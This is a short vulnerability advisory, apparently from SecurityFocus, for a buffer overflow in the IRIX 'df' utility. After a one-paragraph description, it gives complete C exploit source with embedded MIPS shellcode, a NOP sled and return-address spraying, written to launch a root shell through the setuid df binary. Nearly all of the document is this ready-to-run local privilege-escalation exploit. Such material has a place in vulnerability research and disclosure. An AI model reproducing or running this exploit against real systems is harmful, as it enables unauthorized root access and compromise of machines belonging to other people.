source: http://www.securityfocus.com/bid/346/info

A buffer overflow exists in IRIX 5.x and 6.x 'df' utility, from Silicon Graphics Inc. By supplying a long argument to the -f option of df, a user can crash the df program. By carefully crafting a buffer containing machine executable code, an attacker can run arbitrary commands as root. 

/* /bin/df buffer overflow exploit by DCRH */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      1504
#define EXTRA           700
#define OFFSET          0x200
#define IRIX_NOP        0x03e0f825    /* move $ra,$ra */

#define u_long unsigned


u_long get_sp_code[] = {
    0x03a01025,         /* move $v0,$sp         */
    0x03e00008,         /* jr $ra               */
    0x00000000,         /* nop                  */
};

u_long irix_shellcode[] = {
    0x24041234,         /* li $4,0x1234         */
    0x2084edcc,         /* sub $4,0x1234        */
    0x0491fffe,         /* bgezal $4,pc-4       */
    0x03bd302a,         /* sgt $6,$sp,$sp       */
    0x23e4012c,         /* addi $4,$31,264+36   */
    0xa086feff,         /* sb $6,-264+7($4)     */
    0x2084fef8,         /* sub $4,264           */
    0x20850110,         /* addi $5,$4,264+8     */
    0xaca4fef8,         /* sw $4,-264($5)       */
    0xaca6fefc,         /* sw $4,-260($5)       */
    0x20a5fef8,         /* sub $5, 264          */
    0x240203f3,         /* li $v0,1011          */
    0x03ffffcc,         /* syscall 0xfffff      */
    0x2f62696e,         /* "/bin"               */
    0x2f7368ff,         /* "/sh"                */
};

char buf[BUF_LENGTH + EXTRA + 8];

void main(int argc, char **argv)
{
    char *env[] = {NULL};
    u_long targ_addr, stack;
    u_long *long_p;
    int i, code_length = strlen((char *)irix_shellcode)+1;
    u_long (*get_sp)(void) = (u_long (*)(void))get_sp_code;

    stack = get_sp();

    long_p =(u_long *)  buf;
    targ_addr = stack + OFFSET;

    if (argc > 1)
        targ_addr += atoi(argv[1]) * 4;

    while ((targ_addr & 0xff000000) == 0 ||
           (targ_addr & 0x00ff0000) == 0 ||
           (targ_addr & 0x0000ff00) == 0 ||
           (targ_addr & 0x000000ff) == 0)
        targ_addr += 4;

    for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
        *long_p++ = IRIX_NOP;

    for (i = 0; i < code_length/sizeof(u_long); i++)
        *long_p++ = irix_shellcode[i];

    for (i = 0; i < EXTRA / sizeof(u_long); i++)
        *long_p++ = (targ_addr << 16) | (targ_addr >> 16);

    *long_p = 0;

    printf("stack = 0x%x, targ_addr = 0x%x\n", stack, targ_addr);

    execle("/bin/df", "df", &buf[3], 0, env);
    perror("execl failed");
}